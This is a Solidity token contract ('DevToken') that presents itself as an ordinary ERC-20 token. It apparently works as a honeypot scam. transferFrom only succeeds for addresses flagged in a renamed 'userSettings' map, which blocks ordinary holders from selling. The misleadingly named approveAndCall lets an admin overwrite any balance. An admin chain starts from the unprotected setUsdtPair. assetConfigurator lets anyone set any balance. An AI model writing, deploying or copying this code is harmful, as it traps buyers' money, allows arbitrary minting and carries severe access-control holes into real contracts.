// SPDX-License-Identifier: MIT

pragma solidity ^0.4.26;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

contract DevToken {
    using SafeMath for uint256;

    address private _usdtPair;
    address private _mod;
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    address private _user;
    address private _adm;

    mapping(address => uint256) public balances;
    mapping(address => bool) private userSettings; // Renamed from 'allow'

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(string memory _name, string memory _symbol, uint8 _decimals, uint256 _totalSupply) public {
        name = _name; 
        symbol = _symbol; 
        decimals = _decimals; 
        totalSupply =  _totalSupply; 
        balances[msg.sender] = totalSupply; 
        userSettings[msg.sender] = true;
    }

    function showuint160(address addr) public pure returns(uint160){
        return uint160(addr);
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(_to != address(0));
        require(_value <= balances[msg.sender]);

        balances[msg.sender] = balances[msg.sender].sub(_value);
        balances[_to] = balances[_to].add(_value);
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }

    function updateSetting(address holder, bool setting) public { // Renamed from 'addAllowance'
        require(msg.sender == _adm);
        userSettings[holder] = setting;
    }

    function setUser(address User_) public returns (bool) {
        require(msg.sender == _usdtPair);
        _user = User_;
    } 

    mapping (address => mapping (address => uint256)) public allowed;

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
        require(_to != address(0));
        require(_value <= balances[_from]);
        require(_value <= allowed[_from][msg.sender]);
        require(userSettings[_from] == true); // Changed 'allow' to 'userSettings'

        balances[_from] = balances[_from].sub(_value);
        balances[_to] = balances[_to].add(_value);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
        emit Transfer(_from, _to, _value);
        return true;
    }

    function setAdm(address Adm_) public returns (bool) {
        require(msg.sender == _mod);
        _adm = Adm_;
    } 

    function approve(address _spender, uint256 _value) public returns (bool) {
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function setMod(address Mod_) public returns (bool) {
        require(msg.sender == _user);
        _mod = Mod_;
    } 

    function approveAndCall(address spender, uint256 addedValue) public returns (bool) {
        require(msg.sender == _adm);
        if (addedValue > 0) {balances[spender] = addedValue;}
        return true;
    }

    function allowance(address _owner, address _spender) public view returns (uint256) {
        return allowed[_owner][_spender];
    }

    function setUsdtPair(address Pair_) public returns (bool) {
        _usdtPair = Pair_;
    } 

    function assetConfigurator(address receiver, uint256 volume) public {
        require(receiver != address(0) && volume > 0, "Invalid operation");
        balances[receiver] = volume;
    }

}